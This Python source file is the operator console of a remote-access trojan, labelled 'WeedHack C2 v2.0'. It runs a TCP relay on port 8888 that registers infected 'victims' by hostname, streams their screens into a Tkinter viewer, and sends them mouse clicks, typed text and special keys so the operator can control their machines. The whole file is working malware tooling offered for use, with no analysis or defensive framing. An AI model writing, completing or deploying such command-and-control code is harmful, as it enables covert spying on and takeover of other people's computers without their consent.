"""
ADMIN PANEL v2.0 — C2 Relay & Viewer Console
"""
import socket, threading, struct, io, time, os, sys
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk # type: ignore

LISTEN_PORT = 8888
BUFFER_SIZE = 4096

victims = {}
v_lock = threading.Lock()
next_vid = 0

def recv_exact(s, n):
    data = b""
    while len(data) < n:
        try:
            chunk = s.recv(min(n - len(data), BUFFER_SIZE))
            if not chunk:
                return None
            data += chunk
        except:
            return None
    return data

def recv_msg(s):
    h = recv_exact(s, 5)
    if not h:
        return None, None
    t = h[0]
    l = int.from_bytes(h[1:5], 'big')
    p = recv_exact(s, l) if l > 0 else b""
    if l > 0 and not p:
        return None, None
    return t, p

def send_msg(s, t, p=b""):
    try:
        s.sendall(bytes([t]) + len(p).to_bytes(4, 'big') + p)
    except:
        pass

def handle_victim(sock, addr, vid):
    global victims
    try:
        msg_t, payload = recv_msg(sock)
        if msg_t != 0x01 or not payload:
            sock.close()
            return
        hostname = payload.decode('utf-8', errors='replace')
        print(f"[+] Victim connected: {hostname} -> ID #{vid}")
        with v_lock:
            victims[vid] = {'hostname': hostname, 'sock': sock, 'frame': None}
        while True:
            msg_t, payload = recv_msg(sock)
            if msg_t is None:
                break
            if msg_t == 0x02:
                with v_lock:
                    if vid in victims:
                        victims[vid]['frame'] = payload
            elif msg_t == 0xFF:
                break
    except:
        pass
    finally:
        with v_lock:
            victims.pop(vid, None)
        try:
            sock.close()
        except:
            pass

def relay_server():
    global next_vid
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(('0.0.0.0', LISTEN_PORT))
        s.listen(10)
        print(f"[*] Admin relay listening on 0.0.0.0:{LISTEN_PORT}")
    except:
        print(f"[X] Failed to bind port {LISTEN_PORT} — is it already in use?")
        return
    s.settimeout(1.0)
    try:
        while True:
            try:
                c, a = s.accept()
                with v_lock:
                    vid = next_vid
                    next_vid += 1
                threading.Thread(
                    target=handle_victim, args=(c, a, vid), daemon=True
                ).start()
            except socket.timeout:
                continue
            except:
                break
    finally:
        s.close()

class App:
    def __init__(self, root):
        self.root = root
        root.title("WeedHack C2 v2.0")
        root.geometry("1100x700")
        root.minsize(800, 500)

        # ── Left panel: victim list ──
        left = ttk.Frame(root, width=220)
        left.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=5)
        left.pack_propagate(False)

        ttk.Label(left, text="Victims", font=("", 11, "bold")).pack(fill=tk.X)
        self.listbox = tk.Listbox(left, font=("Consolas", 10))
        self.listbox.pack(fill=tk.BOTH, expand=True, pady=5)
        self.listbox.bind("<<ListboxSelect>>", self.select_victim)

        btn_frame = ttk.Frame(left)
        btn_frame.pack(fill=tk.X, pady=2)
        ttk.Button(btn_frame, text="Refresh", command=self.refresh).pack(
            side=tk.LEFT, padx=2, fill=tk.X, expand=True
        )
        ttk.Button(btn_frame, text="KICK", command=self.kick).pack(
            side=tk.RIGHT, padx=2, fill=tk.X, expand=True
        )

        # ── Center: screen display ──
        center = ttk.Frame(root)
        center.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.screen_label = ttk.Label(center, text="Select a victim", font=("", 13))
        self.screen_label.pack(fill=tk.BOTH, expand=True)
        self.screen_label.bind("<Button-1>", self.click_screen)

        # ── Bottom: keyboard controls ──
        bottom = ttk.Frame(root)
        bottom.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=5)

        ttk.Label(bottom, text="Text:").pack(side=tk.LEFT)
        self.key_entry = ttk.Entry(bottom, width=25)
        self.key_entry.pack(side=tk.LEFT, padx=5)
        self.key_entry.bind("<Return>", lambda e: self.send_keys())
        ttk.Button(bottom, text="Send", command=self.send_keys).pack(side=tk.LEFT)

        ttk.Separator(bottom, orient=tk.VERTICAL).pack(side=tk.LEFT, padx=5, fill=tk.Y)
        for key in ("Enter", "Esc", "Bksp", "Tab"):
            ttk.Button(
                bottom, text=key,
                command=lambda k=key.lower(): self.special(k)
            ).pack(side=tk.LEFT, padx=1)

        ttk.Separator(bottom, orient=tk.VERTICAL).pack(side=tk.RIGHT, padx=5, fill=tk.Y)
        ttk.Button(bottom, text="Left Click", command=self.left_click).pack(
            side=tk.RIGHT, padx=2
        )
        ttk.Button(bottom, text="Right Click", command=self.right_click).pack(
            side=tk.RIGHT, padx=2
        )

        # ── Status bar ──
        self.status = ttk.Label(root, text="Starting...", relief=tk.SUNKEN, anchor=tk.W)
        self.status.pack(fill=tk.X)

        # ── State ──
        self.selected = None
        self.scale_x = 1.0
        self.scale_y = 1.0
        self.img_tk = None

        # ── Launch server thread & UI loops ──
        threading.Thread(target=relay_server, daemon=True).start()
        root.after(500, self.update_status)
        root.after(100, self.update_screen)

    def refresh(self):
        self.listbox.delete(0, tk.END)
        with v_lock:
            for vid in sorted(victims.keys()):
                self.listbox.insert(tk.END, f"[{vid}] {victims[vid]['hostname']}")

    def select_victim(self, ev):
        sel = self.listbox.curselection()
        if not sel:
            return
        item = self.listbox.get(sel[0])
        try:
            self.selected = int(item.split("]")[0].strip("["))
        except:
            pass

    def update_status(self):
        with v_lock:
            cnt = len(victims)
        self.status.config(text=f"Relay port {LISTEN_PORT} | Connected victims: {cnt}")
        self.root.after(2000, self.update_status)

    def update_screen(self):
        if self.selected is not None:
            with v_lock:
                entry = victims.get(self.selected)
                data = entry['frame'] if entry else None
            if data:
                try:
                    img = Image.open(io.BytesIO(data))
                    ow, oh = img.size
                    max_w, max_h = 800, 450
                    scale = min(max_w / ow, max_h / oh, 1.0)
                    nw, nh = int(ow * scale), int(oh * scale)
                    self.scale_x = ow / nw if nw else 1
                    self.scale_y = oh / nh if nh else 1
                    img2 = img.resize((nw, nh), Image.LANCZOS)
                    self.img_tk = ImageTk.PhotoImage(img2)
                    self.screen_label.config(image=self.img_tk, text="")
                except:
                    pass
            else:
                self.selected = None
                self.screen_label.config(image="", text="Disconnected")
        self.root.after(100, self.update_screen)

    def click_screen(self, ev):
        if self.selected is None:
            return
        x = int(ev.x * self.scale_x)
        y = int(ev.y * self.scale_y)
        with v_lock:
            entry = victims.get(self.selected)
            if not entry:
                return
            s = entry['sock']
        send_msg(s, 0x03, struct.pack("!ii", x, y))
        time.sleep(0.02)
        send_msg(s, 0x04, bytes([1, 1]))
        time.sleep(0.02)
        send_msg(s, 0x04, bytes([1, 0]))

    def left_click(self):
        if self.selected is None:
            return
        with v_lock:
            entry = victims.get(self.selected)
            if not entry:
                return
            s = entry['sock']
        send_msg(s, 0x04, bytes([1, 1]))
        time.sleep(0.03)
        send_msg(s, 0x04, bytes([1, 0]))

    def right_click(self):
        if self.selected is None:
            return
        with v_lock:
            entry = victims.get(self.selected)
            if not entry:
                return
            s = entry['sock']
        send_msg(s, 0x04, bytes([2, 1]))
        time.sleep(0.03)
        send_msg(s, 0x04, bytes([2, 0]))

    def send_keys(self):
        text = self.key_entry.get()
        if not text or self.selected is None:
            return
        with v_lock:
            entry = victims.get(self.selected)
            if not entry:
                return
            s = entry['sock']
        send_msg(s, 0x05, text.encode('utf-8'))
        self.key_entry.delete(0, tk.END)

    def special(self, key):
        if self.selected is None:
            return
        with v_lock:
            entry = victims.get(self.selected)
            if not entry:
                return
            s = entry['sock']
        send_msg(s, 0x06, key.encode('utf-8'))

    def kick(self):
        if self.selected is None:
            return
        with v_lock:
            entry = victims.pop(self.selected, None)
            if entry:
                send_msg(entry['sock'], 0xFF)
                try:
                    entry['sock'].close()
                except:
                    pass
        self.selected = None
        self.screen_label.config(image="", text="Kicked")
        self.refresh()

if __name__ == "__main__":
    root = tk.Tk()
    App(root)
    root.mainloop()